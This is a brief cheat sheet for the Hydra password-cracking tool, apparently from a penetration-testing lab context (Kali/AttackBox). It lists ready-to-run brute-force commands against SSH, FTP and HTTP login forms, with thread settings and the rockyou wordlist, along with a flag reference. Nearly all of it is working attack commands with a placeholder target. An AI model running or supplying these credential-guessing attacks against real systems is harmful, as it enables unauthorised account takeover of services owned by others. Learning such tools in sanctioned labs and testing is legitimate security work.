# Hydra Commands Cheatsheet

## Basic Syntax
bash
hydra -l [username] -P [wordlist] [target] [service]


## SSH Attack
bash
hydra -l username -P /usr/share/wordlists/rockyou.txt 
TARGET_IP -t 16 ssh


## FTP Attack
bash
hydra -l username -P wordlist.txt TARGET_IP ftp


## Web Form Attack
bash
hydra -l username -P wordlist.txt TARGET_IP 
http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" 
-t 16 -V


## Common Flags
| Flag | Meaning |
|------|---------|
| -l | Single username |
| -L | Username list file |
| -p | Single password |
| -P | Password list file |
| -t | Threads (default 16) |
| -V | Verbose output |
| -f | Stop after first find |
| -s | Custom port |
| -R | Resume previous session |

## Wordlist Location on Kali/AttackBox
bash
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/SecLists/
